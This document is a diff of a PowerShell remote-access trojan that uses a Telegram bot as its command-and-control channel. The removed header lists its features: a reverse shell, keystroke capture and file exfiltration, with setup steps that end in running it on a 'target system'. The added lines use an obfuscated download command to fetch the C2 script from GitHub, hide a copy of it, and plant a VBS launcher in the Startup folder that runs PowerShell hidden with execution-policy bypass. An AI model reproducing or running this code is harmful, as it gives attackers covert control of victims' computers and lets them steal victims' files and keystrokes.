@@ -1,33 +1,3 @@
-<#
-============================================= Beigeworm's Telegram C2 Client ========================================================
-
-SYNOPSIS
-Using a Telegram Bot Chat to Act as a Command and Control Platform.
-This script will wait until it is called in chat by the computer name to take commands from telegram.
-A list of functions can be accessed by typing 'options' in chat, or you can use the chat to act simply as a reverse shell.
-
-FEATURES
-Session Queue - While running, this session waits for a start phrase (the computer name) before connecting, allowing multiple computers to wait for interaction.
-Killswitch - Any functions such as "KeyCapture" and "Exfiltrate" can be killed by changing a text file to contain the word "True" that is served online eg. Github
-           - this returns the session and can accept further commands (does not kill the connection.)
-Persistance - Can add itself to startup folder (RemovePersistance command will undo this)
-Options List - Once connected type "Options" to see a list of operations. 
-Pause Function - Silently exits the script and restarts
-
-SETUP INSTRUCTIONS
-1. visit https://t.me/botfather, click open in telegram and make a bot.
-2. add your new bot API TOKEN to this script.
-3. search for bot in top left box in telegram and start a chat then type /start.
-4. Run Script on target System
-5. Check telegram chat for 'waiting to connect' message.
-7. type in the computer name from that message into telegram bot chat to open the session.
-8. The killswitch text file url ($GHurl) can be set below OR once connected, by typing $GHurl = "YOUR_TEXTILE_URL" in chat.
-
-EXFILTRATION EXAMPLE COMMAND (Exfiltrate -path [FOLDERS] -filetype [FILETYPES] )
-FOLDERS = Documents, Desktop, Downloads, OneDrive, Pictures, Videos
-FILETYPES = log, db, txt, doc, pdf, jpg, jpeg, png, wdoc, xdoc, cer, key, xls, xlsx, cfg, conf, docx, rft
-#>
-
 #------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
 # Define User Variables
 $Token = "$tg"  # Your Telegram Token
@@ -51,9 +21,9 @@ $cmde = [char]::ConvertFromUtf32(0x1F517)
 Write-Output "Starting Telegram C2 Client"
 Sleep 10
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){
-rm -path "$env:TEMP\temp.ps1"
-rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1"
-rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs"
+rm -path "$env:TEMP\temp.ps1" -Force
+rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force
+rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force
 }
 
 # Get Chat ID from the bot
@@ -80,7 +50,6 @@ $contents = "==============================================
 ============ $cmde Commands List $cmde ============
 ==============================================
 Close   : Close this Session
-ShowButtons   : Show buttons for common options
 PauseSession   : Kills this session and restarts
 Persistance   : Add Telegram C2 to Startup
 Screenshot   : Sends a screenshot of the desktop
@@ -116,6 +85,7 @@ Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+rm -Path "$env:temp/tgps.txt" -Force
 exit
 }
 
@@ -257,7 +227,15 @@ Start-Sleep -Milliseconds 10
 
 Function Persistance{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\copy.ps1"
-$scriptDirectory | Out-File -FilePath $newScriptPath -Force
+$scriptContent | Out-File -FilePath $newScriptPath -force
+sleep 1
+if ($newScriptPath.Length -lt 100){
+    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
+    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Force
+    i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
+    sleep 1
+    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+    }
 $attributes = [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $newScriptPath -Name Attributes -Value $attributes
 $tobat = @'
@@ -267,6 +245,7 @@ objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%
 $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
 Write-Output "Persistance Added."
+rm -path "$env:TEMP\temp.ps1" -Force
 }
 
 
@@ -400,12 +379,8 @@ $inlineKeyboardJson = @"
                 "callback_data": "button_clicked"
             },
             {
-                "text": "Close",
-                "callback_data": "button2_clicked"
-            },
-            {
                 "text": "Options",
-                "callback_data": "button3_clicked"
+                "callback_data": "button2_clicked"
             }
     
         ]
@@ -430,30 +405,32 @@ while ($killint -eq 0) {
             $killint = 1
         }
         if ($update.callback_query.data -eq "button2_clicked") {
-            Close
-        }
-        if ($update.callback_query.data -eq "button3_clicked") {
             $killint = 1
             Options
         }
     }
     Start-Sleep -Seconds 2
 }
-$update.callback_query.data = ''
 $contents = "$comp $env:COMPUTERNAME $tick Ready for Commands"
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 }
 
+Function FolderTree{
+
+
+Write-Output "Done."
+}
 
 Function PauseSession{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
-    if ($newScriptPath.Length -lt 100){
-        "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-        i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
-        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
-        }
+if ($newScriptPath.Length -lt 100){
+    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
+    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Force
+    i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
+    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+    }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
@@ -470,7 +447,7 @@ Function IsAuth{
 param($CheckMessage)
     if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
         $script:AcceptedSession="Authenticated"
-        $contents = "$comp $env:COMPUTERNAME $tick Session Started `nType 'Options' to show help"
+        $contents = "$comp $env:COMPUTERNAME $tick Session Started"
         $params = @{chat_id = $ChatID ;text = $contents}
         Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
         ShowButtons
@@ -481,8 +458,8 @@ param($CheckMessage)
 Function StrmFX{
 param($Stream)
 $FixedResult=@()
-$Stream | Out-File -FilePath (Join-Path $env:temp -ChildPath "TGPSMessages.txt") -Force
-$ReadAsArray= Get-Content -Path (Join-Path $env:temp -ChildPath "TGPSMessages.txt") | where {$_.length -gt 0}
+$Stream | Out-File -FilePath (Join-Path $env:temp -ChildPath "tgps.txt") -Force
+$ReadAsArray= Get-Content -Path (Join-Path $env:temp -ChildPath "tgps.txt") | where {$_.length -gt 0}
 foreach ($line in $ReadAsArray){
     $ArrObj=New-Object psobject
     $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
@@ -525,3 +502,4 @@ $messages=rtgmsg
         }
     }
 }
+
